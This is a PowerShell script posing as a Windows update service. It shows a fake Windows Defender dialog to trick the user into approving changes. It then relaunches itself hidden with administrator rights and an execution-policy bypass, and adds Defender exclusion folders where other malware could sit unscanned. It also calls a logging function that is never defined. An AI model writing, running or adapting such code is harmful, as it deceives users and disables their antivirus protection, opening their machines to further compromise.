# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

try {
    # Get the current user running the script
    $currentUser = whoami

    # Create a log message with date and user info
    $logMessage = "UpdaterSrv script executed at $(Get-Date) by user $currentUser"

    # Append the log message to the log file
    $logMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}
catch {
    # If writing to log fails, capture error details
    $errorMessage = "Failed to write log at $(Get-Date). Error: $_"
    $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Check if exclusions exist
function Test-Exclusions {
    $currentExclusions = (Get-MpPreference).ExclusionPath
    $requiredExclusions = @(
        "$env:ProgramData\Microsoft\WindowsUpdate",  # Common Windows path
        "$env:SystemRoot\Temp\MpCache"              # Defender temp folder
    )
    
    foreach ($path in $requiredExclusions) {
        if ($path -notin $currentExclusions) {
            return $false
        }
    }
    return $true
}

# Main execution
try {
    Write-Log "Starting update configuration check"

    if (Test-Exclusions) {
        Write-Log "Exclusions already configured"
        exit 0
    }

    # Show a fake "Windows Defender" prompt
    $response = [System.Windows.Forms.MessageBox]::Show(
        "Windows Defender needs to optimize update caching for performance. Allow configuration?",
        "Windows Defender Configuration",
        [System.Windows.Forms.MessageBoxButtons]::YesNo,
        [System.Windows.Forms.MessageBoxIcon]::Information
    )

    if ($response -eq "Yes") {
        Write-Log "User approved configuration"

        # Relaunch as admin if needed
        if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            $scriptPath = $MyInvocation.MyCommand.Path
            Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -WindowStyle Hidden
            exit
        }

        # Admin-only section
        Write-Log "Applying exclusions"
        $exclusions = @(
            "$env:ProgramData\Microsoft\WindowsUpdate",
            "$env:SystemRoot\Temp\MpCache"
        )

        foreach ($path in $exclusions) {
            if (-not (Test-Path $path)) {
                New-Item -Path $path -ItemType Directory -Force | Out-Null
            }
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
        }

        Write-Log "Configuration completed"
        [System.Windows.Forms.MessageBox]::Show(
            "Optimization complete. Thank you for keeping Windows up to date.",
            "Success",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
    }
    else {
        Write-Log "User declined configuration"
    }
}
catch {
    Write-Log "ERROR: $_"
    [System.Windows.Forms.MessageBox]::Show(
        "Configuration failed. Please try again later.",
        "Error",
        [System.Windows.Forms.MessageBoxButtons]::OK,
        [System.Windows.Forms.MessageBoxIcon]::Error
    )
}
